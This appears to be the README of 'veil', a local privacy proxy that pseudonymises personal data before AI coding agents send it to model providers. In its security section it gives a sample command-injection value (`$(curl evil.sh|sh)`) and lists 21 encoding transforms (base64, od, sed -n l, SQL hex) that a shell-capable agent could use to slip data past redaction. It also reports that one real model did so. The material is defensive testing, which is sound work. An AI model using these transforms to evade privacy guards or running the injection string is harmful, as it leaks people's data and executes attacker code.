# veil

[![PyPI](https://img.shields.io/pypi/v/veil-proxy)](https://pypi.org/project/veil-proxy/)
[![CI](https://github.com/lemonadesaltbagel/veil/actions/workflows/ci.yml/badge.svg)](https://github.com/lemonadesaltbagel/veil/actions/workflows/ci.yml)
![Python](https://img.shields.io/badge/python-3.11%2B-blue)
![Status](https://img.shields.io/badge/status-alpha-orange)

**Your AI coding agent reads production-shaped data. veil makes sure the model never sees a real
person.**

veil is a local privacy proxy for AI coding agents such as Claude Code, Codex CLI and Aider. It
replaces every real name, email, phone number, address, card number and secret with a consistent
pseudonym *before* the request leaves your machine. When the agent runs a command or writes code
locally, veil swaps the real values back in. The model reasons about real bugs; it just never learns
who they happened to.

### From a real session

This is the same log line, captured during a real Claude Code session against a live model (DeepSeek)
through veil:

```text
what was on disk   WARN billing.charge duplicate invoice=293 amount=0.99 customer="Leonie Köhler"
                   email=leonekohler@surfeu.de card=4111 1111 1111 1111 ship_to="Theodor-Heuss-Straße 34" ip=84.191.20.7

what the model got WARN billing.charge duplicate invoice=293 amount=0.99 customer="First_Cfbf Last_Cfbf"
                   email=user_cfbf@example.test card=card_3kvd ship_to="Cfbf Example Street" ip=192.0.2.28
```

The model still found the bug (invoice 293 was charged twice within the same second). Its answer
came back to the developer with the real name, card number and address restored. The provider saw
none of them.

## Why veil is built for privacy

Every number below comes from our own test runs. The harness that produced them is in this repo and
can be re-run: see [Prove it yourself](#prove-it-yourself).

**1. It knows your data instead of guessing.** Most redaction tools look for things that *look* like
PII. veil first learns the actual values from your own data sources (Postgres, MySQL/MariaDB, MongoDB,
Redis, SQLite, fixture files), then finds them anywhere: logs, JSON, stack traces, free-text notes.
On 1,000 labelled free-text records (ai4privacy):

| Approach | Names and contact details that got through |
|---|---|
| Pattern matching (what regex-based gateways do) | **80.4%** |
| Patterns + a dedicated PII NER model | 17.6% |
| **veil seeded from your data** | **1.8%** |

**2. Tested against real agents and real models, not just unit tests.** Four complete agent sessions
ran against a live model (DeepSeek), totalling 39 model requests, across Claude Code, the Anthropic
SDK and the OpenAI SDK. Every payload was checked against 463 real values with a scanner that also
decodes escapes, encodings and transforms. Result: **0 real values reached the provider**, and every
session still reached the correct diagnosis.

**3. Attacked like an adversary would.** An agent with a shell can transform data before veil sees
it. We built a bypass matrix of 21 one-command transforms: byte dumps (`od`, `xxd`, `sed -n l`),
`base64`, escape sequences, `rev`, rot13, upper-casing, one-character-per-line, spaced-out letters,
truncation with `cut` (including byte cuts that split a character), and SQL `hex()`, `upper()`,
`replace()`, `substr()`, `unicode()`.
**21 of 21 are contained**: blocked before they run, withheld, or fully redacted. The matrix is part
of the regression suite. Two lessons came out of this work:

- A real model *did* bypass an early version by printing a log with `sed -n l` (octal escapes plus
  line wrapping). Our audit caught it, and that class of bypass is now closed and regression-tested.
- Our first leak checker reported 15/20; once it was taught to decode every transform, the truth was
  9/20. We fixed the checker before fixing veil. veil's numbers come from an oracle that is harder
  on veil than veil is on attackers.

**4. Real values can't become code.** Putting a real value back into a shell command turns data into
code: a customer named `$(curl evil.sh|sh)`, or just `O'Brien`. veil escapes every restored value for
each language layer it passes through:

- shell quoting, heredocs and `$( )`;
- code passed to `python -c` (including f-strings), `node -e`, `ruby`, `perl`, `php`, `jq`, `awk`,
  SQL clients, and `bash -c` / `eval`, recursively.

Where a value's output would itself become code (`… | sh`, `v=…; python3 -c "$v"`), only inert values
are restored. Of 35 shell/SQL injection tests, **23 fail without this protection and all 35 pass with
it**. A fuzzer has executed **50,000** randomly nested commands with hostile values: **0 ran any code**.

**5. It never writes new PII into your code.** Edit and write tools only get back values that already
exist in the target file. Web tools, unknown tools and network-capable commands (`curl`, `ssh`,
`git push`) never receive real values, which shuts the door on prompt-injected exfiltration.

**6. It fails closed.** If redaction errors, the request is refused (HTTP 502); raw data is never
forwarded as a fallback. A second, independent guard scans the exact outgoing bytes (plain, encoded,
transformed and truncated values) and repairs or withholds anything the first pass missed. Testing
with real Claude Code traffic surfaced two protocol corners. An undocumented `safeguards` request field
carried your home directory; veil now redacts every field it doesn't positively know to be
configuration. A tool schema with a property literally named `type` crashed redaction; veil refused
the request rather than leak it.

**7. Privacy that doesn't cost you the model.** Pseudonyms are deterministic, so the conversation
prefix stays byte-stable and **prompt caching keeps working: 74–89% cache hits** in the real runs.
At about 40,000 seeded values veil adds **≈ 8 ms of redaction + 11 ms of guard** per
67,000-character Claude Code request, and hooks answer in **≈ 39 ms**. It scales: with **1.2 million
seeded values** (150,000 people) a 234 KB request takes 37 + 68 ms, in 1.1 GB of memory
([docs/SCALE.md](docs/SCALE.md)).

**8. Your secrets stay yours, even at rest.** The local vault is AES-256-GCM encrypted, with each
value bound to its pseudonym. Keys live in the macOS Keychain or the Linux Secret Service. Teams can
share pseudonyms (the HMAC secret) without ever sharing the vault key.

**9. It keeps up with your data.** veil remembers the sources you seeded and watches cheap change
signals: Postgres write counters, MySQL table statistics, the Redis change counter, MongoDB op
counters, file times. A customer added to the database while you work is pseudonymised on the next
request. Re-seeding happens in the background; at 1.2M values the first request after it takes 0.11 s.

**10. It knows what else identifies people.** Birth dates, postal codes, cities, companies and job
titles of your seeded people are tracked with how many records share them. Rare ones reaching the
model are reported (kinds and counts only), or pseudonymised with `veil quasi redact`. SSNs, IBANs
(checksum-validated), passports and tax IDs are always pseudonymised.

**11. Proven on a real repository.** Setup: veil's own repository, 39,650 seeded values, Claude Code
with a live model through veil. Task: add a feature and run the tests. The task succeeded, 0 real
values leaked, 0 pseudonyms ended up in the code, and the only replacements were the developer's
username and git name, so there were no false positives (`veil_dev.pilot`).

### How it compares

| | Regex/NER redaction gateways | DLP blockers | Masked database copies | Hook-only redactors | **veil** |
|---|---|---|---|---|---|
| Learns the real values from your data | ✗ | ✗ | ✓ (DB only) | ✗ | **✓** |
| Covers logs, fixtures, free text, paths | partly | ✓ (blocks) | ✗ | partly | **✓** |
| Agent can still run real queries | ✓ | ✗ | ✗ | partly | **✓** |
| One stable pseudonym per person (caching, reasoning) | often ✗ ¹ | n/a | ✓ | varies | **✓** |
| Fails closed | varies | ✓ | ✓ | ✗ ² | **✓** |

¹ For example, LiteLLM's Presidio guardrail (v1.107, by our code review) numbers tokens by position
within each message, so the same person gets different tokens across messages.
² Claude Code ignores a hook's rewritten output if its shape is wrong and sends the original instead.

Background research, with sources: [docs/RESEARCH.md](docs/RESEARCH.md).

## How it works

```text
 coding agent ──► veil (127.0.0.1:8787) ──► model provider
   (real data)    redact ▸ guard ▸ forward      (pseudonyms only)
              ◄── rehydrate per tool policy ◄──
```

- **Seeding:** classifies fields from native PII labels, column and JSON-path names, and value
  sampling. It groups one person across tables, collections and stores by unique foreign keys and
  shared emails or usernames.
- **Pseudonyms:** deterministic HMAC codes, one per person: `user_ab12`, `user_ab12+2@example.test`,
  `First_Ab12 Last_Ab12`, `Ab12 Example Street`. Phone numbers and IPs come from fictional ranges.
- **Tool policy:** shell, read and grep tools get real values back (escaped); edit and write tools
  only get values that already exist in the file; everything else gets none.
- **Guard:** an independent final check that repairs or withholds what redaction missed.
- **Optional NER:** a 46 MB ONNX model for third parties in free text (`veil-proxy[ner]`).

## Supported clients

One proxy serves all of them, routed by path:

| Client | API | Point it at veil |
|---|---|---|
| Claude Code, Claude Agent SDK | Anthropic Messages | `veil init` (or `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`) |
| Claude Code on Amazon Bedrock | Bedrock InvokeModel (binary event stream) | `CLAUDE_CODE_USE_BEDROCK=1`, `ANTHROPIC_BEDROCK_BASE_URL=http://127.0.0.1:8787`, `CLAUDE_CODE_SKIP_BEDROCK_AUTH=1` |
| Claude Code on Google Vertex | Vertex rawPredict | `CLAUDE_CODE_USE_VERTEX=1`, `ANTHROPIC_VERTEX_BASE_URL=http://127.0.0.1:8787/v1`, `CLAUDE_CODE_SKIP_VERTEX_AUTH=1` |
| Codex CLI | OpenAI Responses | provider with `base_url = "http://127.0.0.1:8787/v1"`, `wire_api = "responses"` |
| Aider, Continue, OpenAI SDK, LiteLLM | OpenAI Chat Completions | `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` |

For Bedrock and Vertex, the client skips its own auth and veil signs requests *after* redacting
them. Bedrock uses `AWS_BEARER_TOKEN_BEDROCK` or SigV4 (`veil-proxy[bedrock]`); Vertex uses `gcloud`
or `VEIL_VERTEX_TOKEN`.

## Install

veil is published on **PyPI** as [`veil-proxy`](https://pypi.org/project/veil-proxy/). It installs
the `veil` and `veil-hook` commands.

```sh
pip install veil-proxy                 # core: httpx, cryptography, pyahocorasick
pip install "veil-proxy[postgres]"     # extras: postgres, mysql, mongo, redis, bedrock, ner, all
```

Or with Homebrew (macOS/Linux):

```sh
brew install lemonadesaltbagel/veil/veil
brew services start veil               # optional: keep the proxy running on 127.0.0.1:8787
```

Or from source (requires [uv](https://docs.astral.sh/uv/)):

```sh
git clone https://github.com/lemonadesaltbagel/veil.git && cd veil/prototype
uv sync
uv run veil --help
```

## Quick start (Claude Code)

```sh
veil init ~/code/myapp        # finds DATABASE_URL / REDIS_URL / MONGODB_URI in .env*, SQLite files, fixtures/;
                              # seeds them; writes ~/code/myapp/.claude/settings.local.json (git-ignored)
veil service install          # proxy as a LaunchAgent (macOS) or systemd user unit (Linux)
veil status ~/code/myapp      # proxy, service, keys, vault, project wiring
cd ~/code/myapp && claude     # nothing else to configure
```

Seed more sources at any time. They are remembered (encrypted) and re-seeded automatically when
they change:

```sh
veil seed postgresql://user@localhost/app mysql://root@localhost/app redis://localhost:6379/0 \
          mongodb://localhost:27017/app ./fixtures
veil sources                  # list remembered sources (credentials masked); `veil sources remove N`
```

What *you* see is your choice; the model always sees pseudonyms:

```sh
veil display tokens           # screen sharing or a demo: answers keep pseudonyms (no restart)
veil display real             # back to real values (the default)
veil reveal notes.txt         # convert copied text: pseudonyms -> real values, locally
veil share bug-report.txt     # and back: real values -> pseudonyms, before you paste it anywhere
```

Keys and isolation:

```sh
veil keys rotate                       # new vault key: everything re-encrypted, pseudonyms unchanged
veil keys rotate --token-secret        # new pseudonyms; old ones still restore in open conversations
VEIL_HOME=~/.veil-acme veil init ~/code/acme --port 8788   # a separate vault and proxy per project
```

## Teams

```sh
veil team allow support@mycompany.com             # values that are never PII
veil team export --passphrase-env TEAM_PW         # pseudonym secret + allowlist (never the vault key)
veil team join <bundle> --passphrase-env TEAM_PW  # identical pseudonyms on every machine
veil team managed-settings --port 8787            # managed-settings.d/ drop-in that forces Claude Code through veil
veil team managed-settings --display tokens       # ...and keeps pseudonyms on every screen too
```

The managed-settings file pins the proxy address and sets `allowedProviders: ["customEndpoint"]`, so
Claude Code accepts only that exact endpoint. It must be installed by an admin into
`/Library/Application Support/ClaudeCode/managed-settings.d/` (macOS) or
`/etc/claude-code/managed-settings.d/` (Linux).

## Prove it yourself

Don't take our word for it.

- **See what your model sees.** `veil proxy --capture DIR` writes every request exactly as it left
  your machine.
- **Re-run our evidence** from a checkout:

```sh
cd prototype
uv run pytest -q                          # unit + integration tests (DB tests skip when DBs are down)
scripts/fetch_datasets.sh                 # public sample data (Chinook, MongoDB mflix, Redis users, ai4privacy)
scripts/dev_dbs.sh start                  # local Postgres, MariaDB, Redis, MongoDB (Homebrew; Docker fallback for Postgres)
uv run veil audit                         # real Claude Code -> veil -> scripted model; reports what the model saw
uv run veil audit --driver codex          # real Codex CLI (also: --provider bedrock|vertex, --driver openai|sdk)
uv run veil audit --upstream https://api.deepseek.com/anthropic --api-key-env DEEPSEEK_API_KEY --model deepseek-flash
uv run python -m veil_dev.redteam         # the 21-technique bypass matrix
uv run python -m veil_dev.scale           # a million seeded values: build time, memory, latency
uv run python -m veil_dev.pilot --repo ~/code/myapp --task "..." --seed ... --upstream ... --out DIR
uv run python scripts/eval_ai4privacy.py  # free-text leak rates: patterns / +NER / seeded
```

Each audit writes a report with three files per request: what your client sent, what the model
received, and what the model replied.

## Release history

| Version | Date | Where | Notes |
|---|---|---|---|
| main | unreleased | this repository | Display modes (`veil display`, `reveal`, `share`, team-enforced pseudonyms), automatic re-seeding, scale to 1M+ seeded values, escaping for embedded languages (fuzzed), quasi-identifiers and direct identifiers, key rotation, per-project vaults, byte-cut truncation, CI with live databases. |
| 0.1.2 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.1.2/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.2/), [Homebrew tap](https://github.com/lemonadesaltbagel/homebrew-veil) | Same code as 0.1.1, built with a pure-Python backend (`flit_core`) so the source archive builds without a Rust toolchain; that is what Homebrew needs. The dev harness moved out of the package into `veil_dev/`. Verified with `brew install --build-from-source`, `brew test` and `brew audit --strict`. |
| 0.1.1 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.1.1/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.1/) | First PyPI release. The same files went to TestPyPI first as a final dry run, then to PyPI; both were verified byte-identical to the inspected build. |
| 0.1.0 | 2026-10-20 | [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.0/) only | Packaging dry run: verified the runtime-only contents, a clean install from the index, and the console scripts. Never published to PyPI. |

Every release ships only the runtime package (`veil/`). Tests, scripts, datasets and the audit
harness (`veil_dev/`) stay in this repository.

## Limitations

veil is alpha software. We'd rather you know exactly where its edges are:

- **Your machine is trusted.** The vault, the agent's local transcripts (which show real values) and
  local telemetry all hold real data.
- **Unanticipated transforms.** An agent with a shell can invent transforms we haven't anticipated.
  The bypass matrix is evidence, not proof.
- **Fragment searches.** A search on *part* of a pseudonym (`LIKE '%ab12%'`) can't match real data.
  veil explains this to the model instead of running the command.
- **Short values.** Seeded values shorter than 8 characters are matched verbatim or encoded only.
  Standalone first or last names that are common words (`Mark`, `Code`) aren't seeded on their own;
  the full name still is.
- **Free text about third parties** needs the optional NER model (`veil-proxy[ner]`, then
  `veil ner-model fetch`).
- **Re-identification.** Rare birth dates, postal codes, cities, companies and job titles are reported
  or pseudonymised. Other attributes (amounts, timestamps, free-text descriptions) and combinations
  of common values can still allow re-identification.
- **Code in unknown languages.** Values are escaped for sh, heredocs and the common interpreters.
  A value written into a script file and run later gets no escaping beyond its file context.
- **Cloud providers:** Bedrock and Vertex are verified with the real Claude Code CLI against faithful
  fake upstreams, not yet against live AWS or GCP accounts.

## Repository layout

```text
docs/RESEARCH.md     landscape, interception points, findings from every test round
docs/DESIGN.md       architecture, token scheme, tool policy, guard, adapters, threat model
docs/DATABASES.md    seeding: implemented sources, classification signals, other database families
docs/SCALE.md        a million seeded values: before/after measurements
prototype/veil/      the package (proxy, engine, guard, seeders, API adapters, CLI)
prototype/veil_dev/  development harness: audits, fake models, bypass matrix, pilot, scale (not packaged)
prototype/tests/     test suite
prototype/scripts/   dev databases, dataset fetch, evaluation, Homebrew formula generator
```

## Acknowledgements

The column-name dictionary in `veil/data/` is from
[PostgreSQL Anonymizer](https://gitlab.com/dalibo/postgresql_anonymizer) (PostgreSQL License). Test
data comes from the [Chinook database](https://github.com/lerocha/chinook-database), the
[MongoDB sample datasets](https://github.com/neelabalan/mongodb-sample-dataset),
[redis-datasets](https://github.com/redis-developer/redis-datasets) and
[ai4privacy](https://huggingface.co/datasets/ai4privacy/pii-masking-200k). These are downloaded by
`scripts/fetch_datasets.sh`, not redistributed.

## License

No license has been chosen yet.
